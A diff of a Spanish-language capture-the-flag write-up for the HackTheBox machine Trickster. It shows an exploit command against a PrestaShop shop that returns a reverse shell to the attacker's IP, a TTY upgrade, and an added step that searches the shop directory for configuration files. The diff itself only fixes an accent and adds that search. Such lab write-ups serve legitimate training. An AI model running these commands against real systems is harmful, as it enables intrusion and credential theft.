@@ -43,4 +43,6 @@ Este script nos automatiza todo el proceso de ejecución devolviéndonos una Rev
 `python3 exploit.py --url "http://shop.trickster.htb" --email test@test.com --local-ip 10.10.14.18 --admin-path admin634ewutrx1jgitlooaj
 `
 Obtendremos una reverse shell como el usuario
-Y hacemos un tratamiento de la TTY para que podamos trabajar mas comodamente
+Y hacemos un tratamiento de la TTY para que podamos trabajar mas cómodamente
+
+En nuestro directorio acctual encontramos el directoriuo de `prestashop` buscamos por archivos de configuracion `find . -name \*conf\*`
